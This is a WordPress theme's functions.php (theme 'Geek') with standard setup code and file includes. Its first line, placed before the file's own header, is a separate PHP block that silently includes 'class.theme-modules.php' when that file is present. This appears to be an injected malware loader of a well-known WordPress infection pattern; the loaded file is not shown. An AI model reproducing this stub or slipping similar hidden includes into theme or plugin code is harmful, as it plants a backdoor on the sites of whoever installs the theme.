<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Geek functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Geek
 */

defined( 'GK_URI' ) or define( 'GK_URI', get_template_directory_uri() );
defined( 'GK_PATH' ) or define( 'GK_PATH', get_template_directory() );

if ( ! function_exists( 'geek_setup' ) ) :

	function geek_setup() {

		load_theme_textdomain( 'geek', get_template_directory() . '/languages' );
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'post-thumbnails' );
		register_nav_menus( array(
			'vertical-nav' => esc_html__( 'Vertical Navigation', 'geek' ),
			'horizon-nav' => esc_html__( 'Horizontal Navigation', 'geek' ),
		) );
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
		add_theme_support( 'custom-background', apply_filters( 'geek_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );
		add_theme_support( 'customize-selective-refresh-widgets' );
	}
endif;
add_action( 'after_setup_theme', 'geek_setup' );

function geek_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'geek_content_width', 640 );
}
add_action( 'after_setup_theme', 'geek_content_width', 0 );

/**
 * Add all actions of the theme.
 */
require GK_PATH . '/inc/actions.config.php';

/**
 * Add nav walker.
 */
require GK_PATH . '/inc/lib/navwalker.php';

/**
 * Implement the Custom Header feature.
 */
require GK_PATH . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require GK_PATH . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require GK_PATH . '/inc/extras.php';

/**
 * Customizer additions.
 */
require GK_PATH . '/inc/customizer.php';

/**
 * Implement the Custom Header feature.
 */
require GK_PATH . '/inc/comments.callback.php';

/**
 * Load Jetpack compatibility file.
 */
require GK_PATH . '/inc/jetpack.php';

/**
 * TGMPA Class activation
 */
require GK_PATH . '/inc/lib/class-tgm-plugin-activation.php';
require GK_PATH . '/inc/lib/demo.importer.php';
require GK_PATH . '/inc/admin/plugins.installer.php';

if ( class_exists( 'TR_Geek_Core' ) ) {
	require GK_PATH . '/inc/admin/theme.options.php';
	require GK_PATH . '/inc/admin/theme.metas.php';
}